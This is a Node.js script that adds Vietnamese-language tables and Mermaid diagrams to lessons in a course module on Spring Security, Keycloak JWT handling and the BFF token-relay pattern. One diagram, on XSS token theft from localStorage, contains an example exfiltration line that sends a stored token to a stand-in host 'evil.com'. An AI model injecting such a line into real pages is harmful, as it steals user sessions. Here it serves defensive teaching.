const fs = require('fs');
const path = require('path');

const filePath = path.join(__dirname, '..', 'course', 'js', 'content', 'module5.js');
const content = fs.readFileSync(filePath, 'utf8');
const mod = new Function(`let window = { COURSE_MODULES: [] }; ${content}; return window.COURSE_MODULES[0];`)();

// 1. Lesson 5-1-4: Add Filter Chain Execution Matrix Table
const l514 = mod.lessons.find(x => x.id === '5-1-4');
if (l514 && (!l514.content.includes('|') || !l514.content.includes('---'))) {
  const table514 = `
### Ma Trận Chuỗi Lọc Tiêu Chuẩn Trong SecurityFilterChain:

| Thứ tự bộ lọc | Tên Filter kỹ thuật | Nhiệm vụ chính | Hành động khi vi phạm |
|---|---|---|---|
| **1** | \`CorsFilter\` | Kiểm tra nguồn gốc HTTP Header \`Origin\` | Từ chối ngay nếu domain không nằm trong Whitelist |
| **2** | \`HeaderWriterFilter\` | Ghi các Header phòng vệ (X-Content-Type, HSTS) | Luôn gắn Header an toàn vào Response |
| **3** | \`CsrfFilter\` | Kiểm tra mã Token chống giả mạo request | Vô hiệu hóa (\`csrf.disable()\`) đối với Stateless JWT API |
| **4** | \`BearerTokenAuthenticationFilter\` | Trích xuất chuỗi JWT từ Header \`Authorization\` | Nếu thiếu hoặc sai định dạng: Chuyển tiếp Request ẩn danh |
| **5** | \`ExceptionTranslationFilter\` | Đón bắt ngoại lệ an ninh (Authentication/AccessDenied) | Chuyển thành HTTP 401 Unauthorized hoặc 403 Forbidden |
| **6** | \`AuthorizationFilter\` | Kiểm tra quyền hạn cuối cùng (\`hasRole\`, \`authenticated\`) | Ném \`AccessDeniedException\` nếu User thiếu quyền |
`;
  l514.content += '\n\n' + table514;
}

// 2. Lesson 5-3-2: Add Mermaid Diagram & Tables
const l532 = mod.lessons.find(x => x.id === '5-3-2');
if (l532) {
  const mermaid532 = `
### Sơ Đồ Kiến Trúc: Bộ Chuyển Đổi Quyền Hạn Keycloak (JwtAuthenticationConverter)

\`\`\`mermaid
flowchart TD
    Client["📱 Client Request (Header: Bearer JWT)"] --> Filter["🛡️ BearerTokenAuthenticationFilter"]
    Filter --> Parser["⚙️ NimbusJwtDecoder (Verify Signature via JWKS)"]
    Parser --> Claims["📜 JWT Claims JSON<br/>{ realm_access: { roles: ['ADMIN', 'MANAGER'] } }"]
    
    subgraph CONVERTER ["Custom JwtAuthenticationConverter"]
        Claims --> Extract["🔍 Trích xuất mảng roles từ realm_access"]
        Extract --> Prefix["🏷️ Gắn tiền tố 'ROLE_'<br/>ROLE_ADMIN, ROLE_MANAGER"]
        Prefix --> Auth["🏛️ JwtAuthenticationToken(Principal, Authorities)"]
    end
    
    Auth --> Context["🔒 SecurityContextHolder.getContext()"]
    Context --> MethodSec["🎯 @PreAuthorize(\"hasRole('ADMIN')\") -> Cho phép truy cập!"]

    style CONVERTER fill:#0f172a,stroke:#38bdf8,stroke-width:2px,color:#fff
\`\`\`

### Bảng So Sánh Cấu Trúc Quyền: Spring Security Mặc Định vs Keycloak SSO:

| Tiêu chí | Spring Security 6 Mặc Định | Cấu Trúc Của Keycloak SSO | Giải pháp xử lý |
|---|---|---|---|
| **Vị trí Claim** | \`scope\` hoặc \`scp\` dạng chuỗi cách nhau bằng dấu cách | \`realm_access.roles\` dạng JSON Array lồng nhau | Viết \`Converter<Jwt, Collection<GrantedAuthority>>\` |
| **Quy ước Tiền tố** | Yêu cầu tiền tố bắt buộc: \`ROLE_\` | Trả về tên quyền thuần: \`ADMIN\`, \`USER\` | Tự động cộng chuỗi: \`"ROLE_" + roleName\` |
| **Phân quyền Phương thức** | \`@PreAuthorize("hasRole('ADMIN')")\` | \`@PreAuthorize("hasAuthority('ADMIN')")\` nếu không đổi prefix | Chuẩn hóa toàn bộ về \`hasRole\` theo chuẩn Spring |
`;

  const lineTable532 = `
### Bảng Phân Tích Cú Pháp Converter & Method Security:

| Dòng code / Annotation | Cú pháp kỹ thuật | Ý nghĩa kỹ thuật | Input -> Xử lý -> Tác động |
|---|---|---|---|
| \`jwt.getClaimAsMap("realm_access")\` | Map Claim Extraction | Trích xuất object JSON lồng nhau từ Payload JWT | Đọc thông tin phân quyền do Keycloak Realm cấp phát |
| \`new SimpleGrantedAuthority("ROLE_" + r)\` | Authority Factory | Tạo đối tượng thẩm quyền chuẩn của Spring Security | Đăng ký quyền hạn vào SecurityContext để \`hasRole()\` nhận diện |
| \`@EnableMethodSecurity\` | Configuration Meta | Kích hoạt bộ kiểm tra quyền hạn trước khi gọi hàm | Cho phép sử dụng các biểu thức SpEL như \`@PreAuthorize\` |
| \`@PreAuthorize("hasRole('ADMIN')")\` | Method Guard SpEL | Chặn đứng request tại tầng Service nếu thiếu vai trò | Kiểm tra danh sách Authorities; ném AccessDeniedException nếu thiếu |
`;

  if (!l532.content.includes('```mermaid')) {
    l532.content = l532.content.replace('## 1. Cái này là gì?', '## 1. Cái này là gì?\n\n' + mermaid532);
  }
  if (!l532.content.includes('|') || !l532.content.includes('---')) {
    l532.content += '\n\n' + lineTable532;
  }
}

// 3. Lesson 5-3-3: Add Mermaid Diagram & Table
const l533 = mod.lessons.find(x => x.id === '5-3-3');
if (l533) {
  const mermaid533 = `
### Sơ Đồ Cảnh Báo: Bão Request JWKS Gây Sập Keycloak vs Cơ Chế Caching 24H

\`\`\`mermaid
sequenceDiagram
    autonumber
    actor Client as 📱 10,000 Clients Đồng Thời
    participant API as 🌐 Order Service (Resource Server)
    participant Cache as ⚡ In-Memory JWKS Cache (Caffeine)
    participant KC as 🏛️ Keycloak Auth Server (/certs)

    Note over Client,KC: NGUY CƠ: KHÔNG CACHE JWKS
    Client->>API: 10,000 Request kèm JWT Bearer
    API->>KC: 10,000 HTTP Request xin Public Key cùng lúc!
    Note over KC: Sập CPU Keycloak -> 504 Gateway Timeout!

    Note over Client,KC: GIẢI PHÁP: CACHING PUBLIC KEY VỚI TTL 24H
    Client->>API: Request kèm JWT (Header: kid='key-123')
    API->>Cache: Kiểm tra 'key-123' có trong cache không?
    Cache-->>API: Cache Hit! Trả về RSA Public Key ngay trong 0.01ms
    Note over API: Xác thực chữ ký số tại chỗ, không tốn 1 byte mạng ra ngoài!
\`\`\`

### Bảng Ma Trận Cạm Bẫy JWKS & Giải Pháp Khắc Phục:

| Vấn đề sự cố | Hậu quả sản xuất | Nguyên nhân gốc rễ | Giải pháp kỹ thuật chuẩn |
|---|---|---|---|
| **JWKS Network Storm** | Keycloak sập CPU 100%, toàn bộ microservice tê liệt | Mỗi request xác thực JWT đều gọi HTTP sang Keycloak \`/certs\` | Bật Cache cho JWKS với TTL 24 giờ và refresh bất đồng bộ |
| **Key Rotation Lockout** | Người dùng bị 401 khi Keycloak đổi cặp khóa mới | Cache giữ khóa cũ quá lâu, không biết có khóa mới | Cho phép tìm kiếm cưỡng bức (force refresh) khi gặp \`kid\` lạ |
| **Lệch Prefix ROLE_** | User có role \`ADMIN\` trong token nhưng vẫn bị 403 Forbidden | Spring Security \`hasRole('ADMIN')\` tự ngầm tìm \`ROLE_ADMIN\` | Bổ sung tiền tố \`ROLE_\` trong Converter hoặc dùng \`hasAuthority('ADMIN')\` |
`;

  if (!l533.content.includes('```mermaid')) {
    l533.content = mermaid533 + '\n\n' + l533.content;
  }
}

// 4. Lesson 5-4-2: Add Mermaid Diagram
const l542 = mod.lessons.find(x => x.id === '5-4-2');
if (l542 && !l542.content.includes('```mermaid')) {
  const mermaid542 = `
### Sơ Đồ Kiến Trúc: BFF Token Relay Gateway Che Giấu Token Khỏi Trình Duyệt

\`\`\`mermaid
flowchart LR
    Browser["🌐 Browser (Single Page App)"]
    Gateway["🛡️ Spring Cloud Gateway (BFF)<br/>Lưu Session & Refresh Token an toàn"]
    Keycloak["🏛️ Keycloak Identity Server"]
    OrderSvc["📦 Order Microservice<br/>(OAuth2 Resource Server)"]
    PaySvc["💳 Payment Microservice<br/>(OAuth2 Resource Server)"]

    Browser -->|1. Cookie HttpOnly: SESSION_ID| Gateway
    Gateway <-->|2. Quản lý Access & Refresh Token| Keycloak
    Gateway -->|3. Filter: Token Relay<br/>Tiêm Header: Bearer <JWT>| OrderSvc
    Gateway -->|4. Filter: Token Relay<br/>Tiêm Header: Bearer <JWT>| PaySvc

    style Gateway fill:#065f46,stroke:#10b981,stroke-width:2px,color:#fff
    style Browser fill:#1e293b,stroke:#64748b,color:#fff
\`\`\`
`;
  l542.content = mermaid542 + '\n\n' + l542.content;
}

// 5. Lesson 5-4-3: Add Mermaid Diagram & Table
const l543 = mod.lessons.find(x => x.id === '5-4-3');
if (l543) {
  const mermaid543 = `
### Sơ Đồ Tấn Công: Đánh Cắp Token Từ LocalStorage Qua Lỗ Hổng XSS

\`\`\`mermaid
sequenceDiagram
    autonumber
    actor Victim as 👤 Người Dùng Hợp Lệ
    actor Hacker as 🦹 Kẻ Tấn Công
    participant Web as 🌐 Ứng Dụng Frontend (React/Vue)
    participant LocalStorage as 💾 Trình Duyệt LocalStorage
    participant BFF as 🛡️ Gateway BFF (HttpOnly Cookie)

    Note over Victim,LocalStorage: KỊCH BẢN NGUY HIỂM: LƯU TOKEN TRONG LOCALSTORAGE
    Victim->>Web: Đăng nhập thành công, nhận Access Token
    Web->>LocalStorage: Lưu token vào window.localStorage
    Hacker->>Web: Bơm mã độc XSS qua comment độc hại: <script src="evil.js">
    Note over Web: Script độc chạy: fetch('evil.com?t=' + localStorage.getItem('token'))
    LocalStorage-->>Hacker: Token bị đánh cắp! Hacker chiếm tài khoản hoàn toàn!

    Note over Victim,BFF: KỊCH BẢN BẢO VỆ TUYỆT ĐỐI: BFF COOKIE HTTPONLY
    Victim->>BFF: Đăng nhập thành công
    BFF-->>Victim: Gắn Set-Cookie: SESSIONID=abc; HttpOnly; Secure; SameSite=Strict
    Note over Victim: JavaScript (kể cả mã XSS) TUYỆT ĐỐI KHÔNG THỂ ĐỌC Cookie HttpOnly!
\`\`\`

### Bảng So Sánh Các Giải Pháp Lưu Trữ Token Phía Client:

| Nơi lưu trữ Token | Nguy cơ XSS | Nguy cơ CSRF | Đánh giá an ninh |
|---|---|---|---|
| **LocalStorage / SessionStorage** | ❌ Cực cao (Mọi mã JS đều đọc được) | Miễn nhiễm CSRF | **Nghiêm cấm dùng cho ứng dụng tài chính** |
| **Bộ nhớ RAM JavaScript** | Trung bình (Mất token khi F5 tải lại trang) | Miễn nhiễm CSRF | Chấp nhận được nhưng trải nghiệm người dùng kém |
| **HttpOnly, Secure Cookie (BFF)** | ⭐⭐⭐ Miễn nhiễm XSS hoàn toàn | Phòng chống bằng \`SameSite=Strict\` | **Tiêu chuẩn vàng cho Web Doanh nghiệp** |
| **Mobile Encrypted Keystore** | ⭐⭐⭐ Miễn nhiễm (Phần cứng mã hóa) | Miễn nhiễm CSRF | **Tiêu chuẩn vàng cho iOS / Android Mobile App** |
`;

  if (!l543.content.includes('```mermaid')) {
    l543.content = mermaid543 + '\n\n' + l543.content;
  }
}

// 6. Lesson 5-4-4: Add Architecture Decision Table
const l544 = mod.lessons.find(x => x.id === '5-4-4');
if (l544 && (!l544.content.includes('|') || !l544.content.includes('---'))) {
  const table544 = `
### Ma Trận Quyết Định Kiến Trúc Bảo Mật Doanh Nghiệp (Security ADR Matrix):

| Kịch bản triển khai | Kiến trúc bảo mật tối ưu | Cơ chế truyền nhận | Lý do lựa chọn |
|---|---|---|---|
| **Hệ thống Monolith truyền thống** | Spring Security State Session | Session Cookie (\`JSESSIONID\`) | Đơn giản, tự động đồng bộ trạng thái trong 1 node |
| **Web Single Page App (React/Angular)** | BFF Pattern (Spring Cloud Gateway) | HttpOnly Cookie -> Token Relay | Bảo vệ 100% Token khỏi mã độc XSS trên trình duyệt |
| **Native Mobile App (iOS / Android)** | Authorization Code với PKCE | Header \`Authorization: Bearer\` | Lưu trữ Refresh Token trong Secure Enclave / Keystore |
| **Giao tiếp Microservice nội bộ (B2B)** | OAuth2 Client Credentials Flow | mTLS + JWT Service-to-Service | Xác thực trực tiếp giữa các máy chủ không cần User |
`;
  l544.content += '\n\n' + table544;
}

const out = `window.COURSE_MODULES = window.COURSE_MODULES || [];\nwindow.COURSE_MODULES.push(\n` + JSON.stringify(mod, null, 2) + `\n);\n`;
fs.writeFileSync(filePath, out, 'utf8');
console.log('Module 5 successfully refactored and enriched with full 4 pillars!');
